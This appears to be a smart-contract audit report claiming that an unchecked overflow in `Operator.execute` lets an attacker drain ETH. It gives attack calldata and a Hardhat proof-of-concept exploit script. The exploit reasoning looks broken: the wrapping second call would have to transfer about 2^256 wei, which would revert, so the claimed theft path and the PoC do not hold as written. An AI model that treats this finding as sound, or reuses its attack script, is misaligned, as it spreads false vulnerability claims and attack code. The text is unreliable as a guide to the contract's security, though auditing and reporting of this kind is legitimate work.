### Title
Unchecked overflow of `_sumOfValues` in `Operator.execute` lets attacker extract ETH from the Operator contract - ([File: contracts/Operator.sol](contracts/Operator.sol))

### Summary
`Operator.execute` accumulates the per-call `value` amounts in an `unchecked` block and only verifies `msg.value == _sumOfValues` at the end. A heap overflow is unchecked writes corrupting adjacent memory; the Solidity analog is an unchecked arithmetic overflow corrupting a value-conservation invariant. By supplying `calls_` whose `value` fields sum past `type(uint256).max`, an unprivileged EOA can make `_sumOfValues` wrap to a small number, satisfy the `msg.value` check with almost no payment, and have `functionCallWithValue` dispense real ETH on each call out of the `Operator` contract's own balance.

### Finding Description
The loop executes every attacker-chosen `(target, callData, value)` tuple via `Address.functionCallWithValue` at `contracts/Operator.sol:48`, while the accounting uses `unchecked { _sumOfValues += _value; }` at `contracts/Operator.sol:45-47`. The final check at `contracts/Operator.sol:54` only compares the wrapped total to `msg.value`.

Concrete attacker call: `Operator.execute([{target: WETH_or_gateway, callData: deposit/any payable fn, value: X}, {target: attackerEOA, callData: "", value: 2^256 - X + dust}])` with `msg.value = dust`. The second `value` wraps the sum to `dust`, the check passes, and the first call sends `X` wei funded by the `Operator`'s own ETH balance.

`Operator` accumulates ETH because every user interaction flows through it: calls like `NativeTokenGateway` deposits or `SmartFarmingManager` zaps refund leftover ETH to `msg.sender`, which is the `Operator`, not the user's EOA. So a nonzero contract balance is a realistic deployed state. `nonReentrant` and `setMsgSender` (`contracts/Operator.sol:20-24,36`) do not stop this — the overflow happens inside ordinary external calls that fully succeed.

### Impact Explanation
Theft of ETH held by the `Operator` contract. Since refunds from value-bearing calls routed through `Operator` (native-token deposits, leverage zaps, any target that returns change) are credited to `Operator`, those funds belong to prior users and are directly drainable by the first caller who runs the wrapped-sum payload. This is direct theft of user funds, breaking the value-conservation invariant `msg.value == Σ call.value`.

### Likelihood Explanation
Likelihood depends on `Operator` holding a nonzero ETH balance at some point. Refund-style calls (e.g., `NativeTokenGateway.deposit` paths and zap leftovers) make residual balances plausible over the contract's lifetime; the attack itself is a single permissionless transaction with no privileged role, oracle manipulation, or timing requirement, so any accumulated balance is immediately capturable.

### Recommendation
Remove the `unchecked` around `_sumOfValues += _value` so an overflowing sum reverts, or track spent value per call and require `address(this).balance >= value` semantics. Additionally, forward leftover ETH from executed calls back to `getActualMsgSender()` so refunds don't accrue to the contract.

### Proof of Concept
Hardhat-style reproduction:

```ts
// SPDX-License-Identifier: MIT
import {ethers} from "hardhat";
import {expect} from "chai";

describe("Operator.execute sum overflow", () => {
  it("pays out Operator-held ETH with a wrapped sum", async () => {
    const [attacker, user] = await ethers.getSigners();
    const Operator = await ethers.getContractFactory("Operator");
    const operator = await Operator.deploy();
    await operator.waitForDeployment();

    // Simulate leftover refunds credited to Operator
    const seed = ethers.parseEther("1");
    await user.sendTransaction({to: await operator.getAddress(), value: seed});

    const max = 2n ** 256n;
    const steal = seed;
    const wrap = max - steal + 7n; // makes sum == 7

    await operator.connect(attacker).execute(
      [
        {target: attacker.address, callData: "0x", value: steal},
        {target: attacker.address, callData: "0x", value: wrap},
      ],
      {value: 7n},
    );

    expect(await ethers.provider.getBalance(await operator.getAddress())).to.eq(0n);
  });
});
```

Note: I could not fully verify whether deployed `Operator` instances currently hold ETH or enumerate every refund path that credits it; that residual-balance assumption is the one unverified precondition. If audits establish `Operator` can never hold ETH, this reduces to no impact.